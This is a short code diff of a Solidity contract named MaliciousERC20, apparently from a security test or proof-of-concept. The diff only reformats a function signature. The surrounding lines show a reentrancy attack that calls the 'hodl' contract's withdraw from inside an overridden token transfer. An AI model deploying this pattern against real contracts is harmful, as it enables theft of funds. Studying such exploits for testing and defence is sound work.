@@ -16,11 +16,7 @@ contract MaliciousERC20 is ERC20 {
         targetToken = _token;
     }
 
-    function _transfer(
-        address from,
-        address to,
-        uint256 amount
-    ) internal override {
+    function _transfer(address from, address to, uint256 amount) internal override {
         if (!attackInProgress && from == address(hodl) && amount > 0) {
             attackInProgress = true;
             hodl.withdraw(targetToken);
